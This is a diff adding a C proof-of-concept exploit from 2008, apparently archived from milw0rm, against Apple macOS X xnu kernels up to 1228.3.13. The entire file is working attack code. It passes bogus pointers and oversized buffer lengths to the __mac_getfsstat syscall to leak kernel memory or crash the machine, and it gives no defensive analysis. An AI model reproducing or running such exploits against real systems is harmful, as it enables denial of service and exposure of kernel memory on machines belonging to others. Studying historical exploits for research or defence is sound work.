@@ -1,0 +1,63 @@
+/* xnu-macfsstat-leak.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS POC
+ * by mu-b - Sun 13 Apr 2008
+ *
+ * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
+ *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <fcntl.h>
+#include <string.h>
+#include <sys/mount.h>
+#include <sys/syscall.h>
+#include <sys/utsname.h>
+#include <unistd.h>
+
+#define LEAK_BUFBYTES(a) (sizeof (struct statfs)*a)
+#define LEAK_MACBYTES(a) (sizeof (int)*a)
+
+struct __mac_getfsstat {
+  char *buf;   char _pad[4];
+  int bufsize; char __pad[4];
+  char *mac;   char ___pad[4];
+  int macsize; char ____pad[4];
+  int flags;   char _____pad[4];
+};
+
+int
+main (int argc, char **argv)
+{
+  struct __mac_getfsstat req;
+  int i, n;
+
+  printf ("Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  memset (&req, 0, sizeof req);
+  req.buf = (char *) 0xDEADBEEF;
+  req.bufsize = LEAK_BUFBYTES (65536 * 64);
+  req.mac = (char *) 0xDEADBEEF;
+  req.macsize = LEAK_MACBYTES (65536 * 64);
+
+  for (i = 0; i < 2; i++)
+    {
+      if ((n = syscall (SYS___mac_getfsstat, req.buf, req.bufsize, req.mac, req.macsize, req.flags)) < 0)
+        {
+          fprintf (stderr, "leaked %lu-bytes of kernel memory!\n", LEAK_MACBYTES (65536 * 64));
+        }
+    }
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2009-03-23]
